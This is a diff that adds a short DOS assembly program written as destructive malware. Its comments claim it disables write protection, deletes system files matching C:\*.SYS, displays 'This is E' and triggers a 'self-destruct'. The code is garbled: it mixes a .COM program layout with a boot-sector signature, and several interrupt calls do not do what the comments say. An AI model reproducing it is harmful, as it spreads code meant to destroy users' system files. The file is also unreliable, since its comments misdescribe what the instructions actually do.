@@ -1,0 +1,30 @@
+; E
+
+ORG 100h
+
+start:
+    ; Disable disk write protection
+    mov ax, 440Dh
+    mov bx, 0000h
+    int 21h
+
+    ; Randomly overwrite critical system files
+    mov ah, 41h
+    mov dx, offset files
+    int 21h
+
+    ; E
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; Trigger a system-wide self-destruct sequence
+    mov ah, 0
+    mov al, 4
+    int 19h
+
+message db "This is E", 0
+files db "C:\*.SYS", 0
+
+times 510-($-$$) db 0
+dw 0AA55h
